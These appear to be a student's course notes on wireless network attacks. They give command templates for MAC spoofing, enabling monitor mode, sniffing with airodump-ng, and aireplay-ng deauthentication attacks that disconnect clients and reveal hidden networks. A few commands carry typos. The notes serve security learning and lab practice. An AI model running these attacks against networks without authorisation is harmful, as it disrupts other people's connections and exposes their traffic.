########################     MAC Address  How To Change     ######################################################
iwconfig # to get the wireless interface_name

# downig the wireless interface
ifconfig wlan0 down

# now we are going to change MAC Address
macchanger --random wlan0       # try to use macchanger --help to get more options.

# making wireless card active again.
ifconfig wlan0 up
# get info about the wireless_card
ifonfig wlan0


###########################     Wireless Modes - Managed  Monitor Mode     #################################################

# check the Mode of youe wireless_card (by default it is Managed)
iwconfig wlan0 


airmon-ng

airmon-ng start wlan0       # starting the wireless card in monitor mode.

iwconfig mon0      # perform the check for moniter mode.

airmon-ng stop mon0         # for stopping the monitor mode of our wireless_interface


###########################       Enabling Monitor Mode Manually (2nd method)        ##########################################

ifconfig wlan0 down

iwconfig wlan0 mode monitor

ifconfig wlan0 up

iwconfig wlan0      # perform check for monitor mode.


############################       Enabling Monitor Mode Using airmon-ng (3rd method)      #######################################

airmon-ng       # check the details of your wireless_card

ifconfig wlan0 down

airmon-ng check kill    # this command kills the services that might interfere while enabling monitor mode.

airmon-ng start wlan0       # start the monitor mode.   

ifconfig waln0mon   # perform the check for monitor mode


##########################          Sniffing Basics - Using Airodump-ng     #################################

# Enable the monitor mode and then perforn : 

airodump-ng wlan0mon

BSSID == MAC Address of the Access Point.
PWR == Power i.e. how far the AP is from our WiFi card.
Beacons == It is the signals that AP sends.
Data == the number of useful packets that we sniffed.
/s == This is the number of data packets that we have collected in past 10 secs.


##########################      Targeted Sniffing Using Airodump-ng     ###################################

airodump-ng wlan0mon

airodump-ng --channel [CHANNEL] --bssid [BSSID] --write [file_name] [interface_name]


########################        Deauthentication Attack (Disconnecting Any Device From The Network)     ##################

# to de-authenticate all clients in a specific network.

aireplay-ng --deauth [no_of_packets] -a [Access Point] [INTERFACE]

# to de-authenticate specific clients in a specific network.

aireplay-ng --deauth [no_of_packets] -a [Access Point] -c [Client MAC] [INTERFACE]


######################      013 Discovering Hidden Networks     #####################################

airodump-ng wlan0mon    # if ESSID == <length: 0> then it's a hidden network.

airodump-ng --bssid [BSSID of the source] --channel [CHANNEL] [INTERFACE]

# apply deauthentication attack for very short period of time. (take no. of packets == 5)
aireplay-ng --deauth [no_of_packets] -a [Access Point] -c [Client MAC] [INTERFACE]

# now ESSID reveals the name of hidden network.
